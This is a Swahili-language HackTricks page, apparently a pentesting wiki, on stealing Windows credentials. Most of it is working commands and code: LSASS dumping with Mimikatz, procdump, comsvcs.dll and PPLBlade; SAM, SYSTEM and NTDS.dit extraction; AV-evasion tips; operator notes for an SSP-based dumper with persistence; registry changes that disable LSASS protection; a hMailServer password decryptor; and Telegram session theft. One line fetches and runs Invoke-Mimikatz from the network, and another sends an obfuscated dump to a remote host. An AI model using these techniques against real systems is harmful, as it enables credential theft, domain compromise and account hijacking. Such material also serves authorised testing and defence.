# Kuiba Taarifa za Uthibitishaji za Windows

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Uthibitishaji za Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Tafuta mambo mengine ambayo Mimikatz inaweza kufanya katika** [**ukurasa huu**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Jifunze kuhusu baadhi ya hatua zinazowezekana za kulinda credentials hapa.**](credentials-protections.md) **Hatua hizi za ulinzi zinaweza kuzuia Mimikatz kutoa baadhi ya credentials.**

## Credentials with Meterpreter

Tumia [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ambayo** nimeunda ili **kutafuta passwords na hashes** ndani ya mashine ya mwathiriwa.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Bypassing AV

### Procdump + Mimikatz

Kwa kuwa **Procdump kutoka** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ni zana halali ya Microsoft**, Defender haitambui.\
Unaweza kutumia zana hii **kufanya dump ya mchakato wa lsass**, **kupakua dump** na **kutoa** **credentials ndani ya kompyuta yako** kutoka kwenye dump.

Unaweza pia kutumia [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Mchakato huu hufanywa kiotomatiki kwa kutumia [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Kumbuka**: Baadhi ya **AV** zinaweza **kutambua** matumizi ya **procdump.exe ku-dump lsass.exe** kuwa **hasidi**; hii ni kwa sababu zinatambua mifuatano **"procdump.exe" na "lsass.exe"**. Kwa hiyo, ni **stealthier** zaidi kupitisha **PID** ya lsass.exe kama **argument** kwa procdump **badala ya** jina la **lsass.exe.**

### Ku-dump lsass kwa kutumia **comsvcs.dll**

DLL inayoitwa **comsvcs.dll**, inayopatikana katika `C:\Windows\System32`, inawajibika kwa **ku-dump kumbukumbu ya mchakato** kunapotokea hitilafu. DLL hii inajumuisha **function** inayoitwa **`MiniDumpW`**, iliyoundwa kuitwa kwa kutumia `rundll32.exe`.\
Haijalishi kutumia arguments mbili za kwanza, lakini ya tatu imegawanywa katika vipengele vitatu. ID ya mchakato unaotakiwa ku-dump ndiyo kipengele cha kwanza, eneo la faili la dump ndilo la pili, na kipengele cha tatu lazima kiwe neno **full**. Hakuna chaguo mbadala.\
Baada ya kuchanganua vipengele hivi vitatu, DLL huanza kuunda faili la dump na kuhamisha kumbukumbu ya mchakato uliobainishwa hadi kwenye faili hili.\
Inawezekana kutumia **comsvcs.dll** ku-dump mchakato wa lsass, hivyo kuondoa hitaji la kupakia na kutekeleza procdump. Mbinu hii imeelezwa kwa kina katika [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Amri ifuatayo hutumika kwa utekelezaji:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Una unaweza kufanya mchakato huu kiotomatiki kwa kutumia** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Kudump lsass kwa kutumia Task Manager**

1. Bofya kulia kwenye Task Bar kisha ubofye Task Manager
2. Bofya More details
3. Tafuta mchakato wa "Local Security Authority Process" kwenye kichupo cha Processes
4. Bofya kulia kwenye mchakato wa "Local Security Authority Process" kisha ubofye "Create dump file".

### Kudump lsass kwa kutumia procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ni binary iliyosainiwa na Microsoft, iliyo sehemu ya suite ya [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Crash dump ya mfumo mzima iliyokuwepo tayari, au nakala iliyobanwa kwenye folda ya mtumiaji inayoweza kufikiwa, huenda ikahifadhi credential material kwa ajili ya uchanganuzi wa offline. Majina ya faili kama `MEMORY.DMP` na `MEMORY.7z` ni vidokezo vya kuanza ukaguzi tu: thibitisha chanzo na ufikiaji, na usidhani kuwa zina credentials zinazoweza kutumika au zilizo za sasa.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Utoaji wa credentials bila mtandao kutoka kwenye snapshots za VM

Backup ya VM inayoweza kusomeka inaweza kuwa na **guest memory image** iliyohifadhiwa, hata bila ufikiaji wa guest inayoendeshwa au LSASS. Kwa VMware, tambua metadata ya snapshot ya `.vmsn` na `.vmem` yake inayohusiana inapokuwepo; usichanganye mojawapo na image ya diski ya `.vmdk`. `VMkatz` huchanganua snapshot au ingizo la saraka ya VM na inaweza kurejesha [credentials za Windows logon-session](credentials-mimikatz.md), kama vile hashes na tickets, kutoka kwenye guest memory. Pia inaweza kuchunguza diski pepe kutafuta material ya SAM/LSA. Sharti la awali ni ufikiaji wa faili za backup, si haki za debug kwenye VM inayoendeshwa.<sup>[[17]](#references)[[18]](#references)</sup>

```bash
vmkatz snapshot.vmsn
vmkatz --disk disk.vmdk snapshot.vmsn   # Resolve paged-out data when a disk is available
vmkatz /path/to/vm-directory/          # Discover supported VM files
```

Mfano katika Checkpoint ulipata NT hash ya Administrator **ya ndani** kutoka kwenye snapshot ya VM inayojitegemea. Iliithibitisha tu kwenye domain baada ya kuthibitisha kando kuwa nenosiri lilitumika tena; hash ya ndani kutoka kwenye backup si credential ya domain moja kwa moja. Kwenye host yenye kumbukumbu chache, VMkatz inaweza kuchanganua na kuachilia kurasa hatua kwa hatua, lakini kunakili snapshot kwenye host kubwa zaidi ya uchanganuzi bado kunaweza kufaa zaidi.<sup>[[17]](#references)[[18]](#references)</sup>

## Kudump lsass kwa kutumia PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ni zana ya kudump Protected Process inayoweza kuficha memory dump na kuihamisha kwenye workstation za mbali bila kuihifadhi kwenye diski.

**Vipengele muhimu**:

1. Kukwepa ulinzi wa PPL
2. Kuficha faili za memory dump ili kukwepa mifumo ya Defender ya ugunduzi unaotegemea signature
3. Kupakia memory dump kwa kutumia mbinu za upakiaji za RAW na SMB bila kuihifadhi kwenye diski (fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – Dumping ya LSASS inayotumia SSP bila MiniDumpWriteDump

Ink Dragon inasambaza dumper ya hatua tatu inayoitwa **LalsDumper**, ambayo haiiti kamwe `MiniDumpWriteDump`; kwa hivyo, EDR hooks kwenye API hiyo haziwashwi:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – hutafuta `fdp.dll` kwa placeholder yenye herufi 32 za `d` ndogo, huibadilisha kwa njia kamili ya `rtu.txt`, huhifadhi DLL iliyorekebishwa kama `nfdp.dll`, kisha huita `AddSecurityPackageA("nfdp","fdp")`. Hii hulazimisha **LSASS** kupakia DLL hasidi kama Security Support Provider (SSP) mpya.
2. **Stage 2 ndani ya LSASS** – LSASS inapopakia `nfdp.dll`, DLL husoma `rtu.txt`, hufanya XOR kwa kila byte kwa kutumia `0x20`, na ku-map blob iliyodekodiwa kwenye memory kabla ya kuhamisha utekelezaji.
3. **Stage 3 dumper** – payload iliyowekwa kwenye memory hutekeleza upya mantiki ya MiniDump kwa kutumia **direct syscalls** zinazotatuliwa kutoka kwa majina ya API yaliyohashiwa (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Export maalum inayoitwa `Tom` hufungua `%TEMP%\<pid>.ddt`, huandika dump ya LSASS iliyobanwa kwenye faili, na kufunga handle ili exfiltration iweze kufanyika baadaye.

Maelezo kwa operator:

* Weka `lals.exe`, `fdp.dll`, `nfdp.dll`, na `rtu.txt` kwenye saraka moja. Stage 1 hubadilisha placeholder iliyowekwa kwa njia isiyobadilika na njia kamili ya `rtu.txt`, kwa hivyo kuziweka sehemu tofauti huvunja mnyororo.
* Usajili hufanyika kwa kuongeza `nfdp` kwenye `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Unaweza kuweka thamani hiyo mwenyewe ili kufanya LSASS ipakie upya SSP kila inapoanzishwa.
* Faili za `%TEMP%\*.ddt` ni dumps zilizobanwa. Zibandue locally, kisha uzitumie kwenye Mimikatz/Volatility kwa ajili ya credential extraction.
* Kuendesha `lals.exe` kunahitaji admin/SeTcb rights ili `AddSecurityPackageA` ifanikiwe; baada ya simu hiyo kurejesha matokeo, LSASS hupakia SSP hasidi bila kuonekana na kutekeleza Stage 2.
* Kuondoa DLL kwenye diski hakuiondoi kwenye LSASS. Futa ingizo la registry na uanzishe upya LSASS (reboot), au iache kwa persistence ya muda mrefu.

## CrackMapExec

### Dump SAM hashes

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump siri za LSA

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Tupa NTDS.dit kutoka kwa DC lengwa

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump historia ya nywila ya NTDS.dit kutoka DC lengwa

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Onyesha sifa ya pwdLastSet kwa kila akaunti ya NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Kuiba SAM na SYSTEM

Faili hizi zinapaswa **kupatikana** katika _C:\windows\system32\config\SAM_ na _C:\windows\system32\config\SYSTEM._ Lakini **huwezi kuzinakili tu kwa njia ya kawaida** kwa sababu zinalindwa.

### Kutoka kwenye Registry

Njia rahisi zaidi ya kuiba faili hizo ni kupata nakala kutoka kwenye Registry:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Pakua** faili hizo kwenye mashine yako ya Kali na **toa hashes** kwa kutumia:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Unaweza kunakili faili zilizolindwa kwa kutumia huduma hii. Unahitaji kuwa Administrator.

#### Using vssadmin

Binary ya vssadmin inapatikana tu katika matoleo ya Windows Server.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Lakini unaweza kufanya vivyo hivyo kutoka **Powershell**. Huu ni mfano wa **jinsi ya kunakili faili la SAM** (diski kuu inayotumika ni "C:" na faili huhifadhiwa kwenye C:\users\Public), lakini unaweza kutumia njia hii kunakili faili lolote lililolindwa:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Msimbo kutoka kwenye kitabu: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Hatimaye, unaweza pia kutumia [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) kutengeneza nakala za SAM, SYSTEM na ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Vitambulisho vya Active Directory - NTDS.dit**

Faili ya **NTDS.dit** inajulikana kama kiini cha **Active Directory**, na huhifadhi data muhimu kuhusu object za watumiaji, groups na uanachama wao. Hapa ndipo **password hashes** za watumiaji wa domain huhifadhiwa. Faili hii ni database ya **Extensible Storage Engine (ESE)** na hupatikana kwenye **_%SystemRoom%/NTDS/ntds.dit_**.

Database hii ina majedwali matatu makuu:

- **Data Table**: Jedwali hili huhifadhi maelezo kuhusu object kama watumiaji na groups.
- **Link Table**: Hufuatilia mahusiano, kama vile uanachama wa groups.
- **SD Table**: **Security descriptors** za kila object huhifadhiwa hapa, ili kuhakikisha usalama na udhibiti wa ufikiaji wa object zilizohifadhiwa.

Utafiti wa Christoffer Andersson kuhusu tabaka la database unaeleza majedwali haya na tabia zake kulingana na matoleo kwa undani zaidi.<sup>[[8]](#references)</sup>

Windows hutumia _Ntdsa.dll_ kuingiliana na faili hiyo, na hutumiwa na _lsass.exe_. Kwa hiyo, **sehemu** ya faili ya **NTDS.dit** inaweza kupatikana **ndani ya kumbukumbu ya `lsass`** (huenda data iliyofikiwa hivi karibuni ikapatikana kwa sababu ya maboresho ya utendaji yanayotumia **cache**).

#### Kusimbua hashes zilizo ndani ya NTDS.dit

Hash husimbwa mara tatu:

1. Simbua Password Encryption Key (**PEK**) kwa kutumia **BOOTKEY** na **RC4**.
2. Simbua **hash** kwa kutumia **PEK** na **RC4**.
3. Simbua **hash** kwa kutumia **DES**.

**PEK** ina **thamani ileile kwenye kila domain controller**, lakini **imesimbwa** ndani ya **NTDS.dit** kwa kutumia **BOOTKEY** maalum ya DC kutoka kwenye hive ya **SYSTEM** ya domain controller hiyo. Kwa hiyo, kutoa vitambulisho kunahitaji **NTDS.dit** na **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

Mbinu tofauti ya [kernel handle-table redirection](../../binary-exploitation/windows-kernel-exploitation/file-handle-table-object-redirection.md) inaweza kunakili object ya faili ya NTDS ambayo tayari imefunguliwa bila kutumia VSS, lakini inahitaji primitive ya kusoma/kuandika kernel kiholela kwenye domain controller.<sup>[[16]](#references)</sup>

### Kunakili NTDS.dit kwa kutumia Ntdsutil

Imepatikana tangu Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Unaweza pia kutumia mbinu ya [**volume shadow copy**](#stealing-sam-and-system) kunakili faili ya **ntds.dit**. Kumbuka kwamba utahitaji pia nakala ya **SYSTEM file** (tena, tumia mbinu ya [**kuitoa kwenye registry au kutumia volume shadow copy**](#stealing-sam-and-system)).

### **Kutoa hashes kutoka NTDS.dit**

Baada ya **kupata** faili za **NTDS.dit** na **SYSTEM**, unaweza kutumia zana kama _secretsdump.py_ **kutoa hashes**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Unaweza pia **kuzitoa kiotomatiki** ukitumia mtumiaji halali wa domain admin:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Kwa **faili kubwa za NTDS.dit**, inapendekezwa kuzitoa kwa kutumia [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Hatimaye, unaweza pia kutumia **moduli ya metasploit**: _post/windows/gather/credentials/domain_hashdump_ au **mimikatz** `lsadump::lsa /inject`

### **Kutoa vitu vya domain kutoka NTDS.dit na kuviweka kwenye hifadhidata ya SQLite**

Vitu vya NTDS vinaweza kutolewa na kuwekwa kwenye hifadhidata ya SQLite kwa kutumia [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Sio siri pekee zinazotolewa, bali pia vitu vyote na sifa zake, ili kupata maelezo zaidi wakati faili ghafi ya NTDS.dit tayari imepatikana.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

Hive ya `SYSTEM` ni ya hiari, lakini huruhusu usimbuaji wa secrets (NT & LM hashes, supplemental credentials kama vile cleartext passwords, kerberos au trust keys, na historia za NT & LM passwords). Pamoja na taarifa nyingine, data ifuatayo hutolewa: akaunti za watumiaji na mashine pamoja na hashes zake, alama za UAC, mihuri ya muda ya kuingia na kubadilisha password mara ya mwisho, maelezo ya akaunti, majina, UPN, SPN, groups na uanachama wa kurudia, mti wa organizational units na uanachama, trusted domains pamoja na aina, mwelekeo na sifa za trusts...

## Lazagne

Pakua binary kutoka [hapa](https://github.com/AlessandroZ/LaZagne/releases). Unaweza kutumia binary hii kutoa credentials kutoka kwenye software mbalimbali.

```
lazagne.exe all
```

## Zana nyingine za kutoa vitambulisho kutoka SAM na LSASS

### Windows credentials Editor (WCE)

Zana hii inaweza kutumika kutoa vitambulisho kutoka kwenye kumbukumbu. Ipakue kutoka: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Toa vitambulisho kutoka kwenye faili la SAM

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Toa taarifa za uthibitishaji kutoka kwenye faili la SAM

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Ipakue kutoka:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) kisha **iendeshe** tu, na nywila zitatolewa.

## Kuchunguza vipindi vya RDP visivyotumika na kudhoofisha vidhibiti vya usalama

FinalDraft RAT ya Ink Dragon inajumuisha tasker ya `DumpRDPHistory`, ambayo mbinu zake zinafaa kwa red-teamer yeyote:<sup>[[3]](#references)</sup>

### Ukusanyaji wa telemetry kwa mtindo wa DumpRDPHistory

* **Malengo ya RDP ya nje** – changanua kila hive ya mtumiaji katika `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Kila subkey huhifadhi jina la seva, `UsernameHint`, na muhuri wa muda wa uandishi wa mwisho. Unaweza kuiga mantiki ya FinalDraft kwa kutumia PowerShell:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Ushahidi wa RDP inayoingia** – tafuta kwenye logi ya `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` Event IDs **21** (kuingia kumefaulu) na **25** (kutenganisha muunganisho) ili kubaini ni nani aliyesimamia mashine:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Baada ya kujua ni Domain Admin gani huunganisha mara kwa mara, dump LSASS (kwa kutumia LalsDumper/Mimikatz) wakati session yake iliyokatika muunganisho bado ipo. CredSSP + NTLM fallback huacha verifier na token zake kwenye LSASS, ambazo zinaweza kutumika tena kupitia SMB/WinRM ili kupata `NTDS.dit` au kuweka persistence kwenye domain controllers.

### Kushusha kiwango kwa Registry kunakolengwa na FinalDraft

Implant hiyo hiyo pia hubadilisha kwa nia mbaya funguo kadhaa za Registry ili kurahisisha wizi wa credentials:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` huzima Restricted Admin kwa RDP inayoingia; **haiwezeshi** pass-the-hash kupitia hali hiyo. Kuweka thamani kuwa `0` huruhusu Restricted Admin kwenye mashine lengwa, lakini mteja lazima aombe `/RestrictedAdmin` au atumie sera inayohitaji Restricted Admin.<sup>[[14]](#references)</sup> Hash pekee haitoi haki za msimamizi wa mbali; tazama [masharti ya uthibitishaji wa RDP](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1` huzima uchujaji wa tokeni za UAC ili wasimamizi wa ndani wapate tokeni zisizo na vizuizi kupitia mtandao.
* `DSRMAdminLogonBehavior=2` humruhusu msimamizi wa DSRM kuingia wakati DC iko mtandaoni, hivyo kuwapa washambuliaji akaunti nyingine iliyojengewa ndani yenye haki za juu.
* `RunAsPPL=0` huondoa ulinzi wa LSASS PPL, na kufanya ufikiaji wa kumbukumbu kuwa rahisi sana kwa zana za kutupa kumbukumbu kama LalsDumper.

## Sifa za usanidi wa hMailServer (baada ya kuathiriwa)

Kagua faili kamili za usanidi `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`, na `C:\ProgramData\hMailServer\hMailServer.ini` kulingana na mpangilio wa usakinishaji. Thamani ya `[Security] AdministratorPassword=` inayosomeka na isiyo tupu ni hash ya nenosiri la usimamizi la hMailServer; si ushahidi wa nenosiri la Windows Administrator. Nenosiri hilo likipatikana, kuhamia kwenye akaunti ya Windows kunahitaji kuthibitisha kwa njia huru kuwa nenosiri limetumika tena na kuwa haki za kuingia zipo.

Kwa usakinishaji unaotumia hifadhidata ya SQL CE, thamani tofauti ya `[Database] Password=` katika INI hulinda hifadhidata. Katika usakinishaji wa zamani, thamani hii husimbwa kwa Blowfish kwa kutumia ufunguo tuli `THIS_KEY_IS_NOT_SECRET` na ubadilishaji wa endianness wa maneno ya baiti 4. Tumia mfuatano wa hex kutoka kwenye INI pamoja na kipande hiki cha Python:<sup>[[2]](#references)</sup>

Kwanza thibitisha kuwa akaunti ya sasa inaweza kusoma **zote mbili**: INI na hifadhidata husika ya SQL CE `.sdf`. Nenosiri la INI hulinda hifadhidata; ni tofauti na hash za akaunti za mailbox zilizohifadhiwa ndani yake. Kagua au boresha **nakala** ya hifadhidata inayotumika; usiwahi kutumia faili ya moja kwa moja.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Kwa nenosiri lililo katika maandishi wazi, nakili hifadhidata ya SQL CE ili kuepuka kufungwa kwa faili, pakia provider ya 32-bit, na uboreshe ikihitajika kabla ya kuuliza hashes:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Safu wima ya `accountpassword` hutumia fomati ya hash ya hMailServer (hali ya hashcat `1421`). Nenosiri la mailbox lililovunjwa huwa njia ya kuingia kama mtumiaji wa Windows tu ikiwa akaunti ya ndani/ya domain inatumia tena nenosiri hilo na akaunti hiyo ina haki zinazohitajika za kuingia kwa mbali.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Baadhi ya zana hunasa **manenosiri ya kuingia kwa maandishi wazi** kwa kunasa callback ya kuingia ya LSA `LsaApLogonUserEx2`. Wazo ni kuingilia au kufunga callback ya kifurushi cha uthibitishaji ili kunasa vitambulisho **wakati wa kuingia** (kabla ya hashing), kisha kuvihifadhi kwenye diski au kumrudishia opereta. Hili kwa kawaida hutekelezwa kama helper inayoingizwa ndani ya LSA au kusajiliwa nayo, kisha kurekodi kila tukio la kuingia kwa mafanikio, iwe la ndani au la mtandao, pamoja na jina la mtumiaji, domain na nenosiri.<sup>[[1]](#references)</sup>

Maelezo ya kiutendaji:
- Inahitaji haki za local admin/SYSTEM ili kupakia helper kwenye njia ya uthibitishaji.
- Vitambulisho vilivyonaswa huonekana tu mtu anapoingia (kwa njia ya ndani, RDP, service au mtandao, kutegemea hook).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) huhifadhi maelezo ya muunganisho yaliyohifadhiwa kwenye faili ya `sqlstudio.bin` ya kila mtumiaji. Zana maalum za kudump faili zinaweza kuichanganua na kurejesha vitambulisho vya SQL vilivyohifadhiwa. Katika shell zinazorejesha matokeo ya amri pekee, faili mara nyingi hutolewa kwa kuisimba kama Base64 na kuichapisha kwenye stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Kwa upande wa operator, jenga upya faili na uendeshe dumper ndani ya mashine ili kurejesha credentials:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Wizi wa session ya kivinjari na cookies kupitia Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Wizi wa session ya Telegram Desktop `tdata`

Telegram Desktop huhifadhi hali ya idhini na akaunti kwenye saraka yake ya **`tdata`**. Session iliyonakiliwa inaweza kupakiwa kwa zana zinazoendana nayo ili kuthibitisha akaunti bila nenosiri, mradi idhini hiyo bado ni halali; ikiwa usimbaji fiche wa data ya ndani umewashwa, stealer pia huhitaji passcode. Session iliyoidhinishwa inaweza kufichua data ya utambulisho, metadata ya mazungumzo na uanachama, ujumbe na media zinazoweza kupakuliwa.<sup>[[10]](#references)</sup>

### Ugunduzi na upatikanaji

Tafuta katika miundo ya usakinishaji na inayobebeka; majina ya vifurushi vya Microsoft Store hutofautiana, kwa hivyo orodhesha saraka za vifurushi zilizo na `TelegramMessenge` na ukague saraka zake ndogo za `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Ikiwa usomaji wa kawaida hautafaulu na tokeni ya mchakato **tayari ina** `SeBackupPrivilege` **na imeiwezesha**, ufikiaji unaotambua backup hutoa njia mbadala; haupati privilege hiyo wala kuinua ruhusa za mchakato. `CreateFileW` yenye `FILE_FLAG_BACKUP_SEMANTICS` inaweza kuomba semantiki za backup/restore na kupuuza ukaguzi wa usalama wa faili wakati privileges zinazohitajika zipo kwenye tokeni, lakini flag hiyo pekee haiwezi kushinda lock ya kushiriki faili isiyoendana.<sup>[[10]](#references)[[11]](#references)</sup>

